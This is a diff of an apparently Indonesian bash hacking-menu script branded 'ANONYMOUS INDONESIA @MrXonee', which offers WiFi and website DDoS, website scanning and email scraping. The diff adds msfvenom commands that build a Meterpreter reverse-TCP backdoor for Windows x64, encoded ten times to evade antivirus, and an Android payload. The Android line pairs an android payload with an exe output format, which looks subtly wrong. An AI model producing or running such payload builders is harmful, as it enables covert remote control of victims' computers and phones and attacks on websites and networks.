@@ -28,8 +28,8 @@ echo "$e[e]─>>DDOS ATTACK WIFI" | lolcat
 echo "$f[f]─>>DDOS ATTACK WEBSITE" | lolcat
 echo "$g[g]─>>SCANNING WEBSITE ADDRESS" | lolcat
 echo "$h[h]─>>EMAIL SCRAPER WEBSITE" | lolcat
-echo "$i[i]─>>CREATE PAYLOAD TO IMAGE" | lolcat
-echo "$j[j]─>>" | lolcat
+echo "$i[i]─>>CREATE PAYLOAD FOR WINDOWS x64" | lolcat
+echo "$j[j]─>>CREATE PAYLOAD FOR ANDROID" | lolcat
 echo "$k[k]─>>" | lolcat
 echo "$l[l]─>>" | lolcat
 echo "$m[m]─>>" | lolcat
@@ -243,7 +243,7 @@ sleep 2
 echo "##################################################################################"
 toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
 echo "**********************************************************************************"
-echo "[!]RUNNING TOOLS CREATE PAYLOAD TO IMAGE" | lolcat
+echo "[!]RUNNING TOOLS CREATE PAYLOAD FOR WINDOWS x64" | lolcat
 echo "##################################################################################"
 sleep 5
 ifconfig
@@ -254,10 +254,10 @@ read -p"╰─>> " lport
 echo "##################################################################################" | lolcat
 echo "[!]MOHON TUNGGU SAMPAI SELESAI" | lolcat
 echo "##################################################################################" | lolcat
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -a x64 --platform windows -e x64/zutto_dekiru -i 10 -n 500 -f exe -o venom.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -a x64 --platform windows -e x64/zutto_dekiru -i 10 -n 500 -f exe -o windowsx64.exe
 echo "##################################################################################" | lolcat
 echo "[!]SUCCESS CREATE PAYLOAD..." | lolcat
-echo "[!]CHECK PAYLOAD AT FOLDER Tools/venom.exe" | lolcat
+echo "[!]CHECK PAYLOAD AT FOLDER Tools" | lolcat
 echo "##################################################################################" | lolcat
 echo "╭─[Ketik bash it.sh Jika Ingin Kembali]" | lolcat
 read -p"╰─>> " back
@@ -273,9 +273,25 @@ sleep 2
 echo "##################################################################################"
 toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
 echo "**********************************************************************************"
-echo "[!]" | lolcat
+echo "[!]RUNNING TOOLS CREATE PAYLOAD FOR ANDROID" | lolcat
 echo "##################################################################################"
 sleep 5
+ifconfig
+echo "╭─[Masukan IP Address Komputer/Laptop]" | lolcat
+read -p"╰─>> " lhost
+echo "╭─[Masukan PORT]" | lolcat
+read -p"╰─>> " lport
+echo "##################################################################################" | lolcat
+echo "[!]MOHON TUNGGU SAMPAI SELESAI" | lolcat
+echo "##################################################################################" | lolcat
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o android.exe
+echo "##################################################################################" | lolcat
+echo "[!]SUCCESS CREATE PAYLOAD..." | lolcat
+echo "[!]CHECK PAYLOAD AT FOLDER Tools" | lolcat
+echo "##################################################################################" | lolcat
+echo "╭─[Ketik bash it.sh Jika Ingin Kembali]" | lolcat
+read -p"╰─>> " back
+$back
 fi
 
 if [ $pil = k ]
